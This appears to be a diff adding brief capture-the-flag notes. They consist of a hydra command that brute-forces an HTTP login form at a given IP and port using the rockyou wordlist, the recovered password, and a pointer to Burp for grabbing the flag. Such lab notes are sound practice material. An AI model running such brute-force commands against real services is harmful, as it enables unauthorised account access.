@@ -1,0 +1,5 @@
+hydra -s 32397 -l try -P /usr/share/wordlists/rockyou.txt 139.59.202.58 http-post-form "/:password=^PASS^:Invalid password!"
+
+    > password = leonardo
+
+capture login with burp to get flag
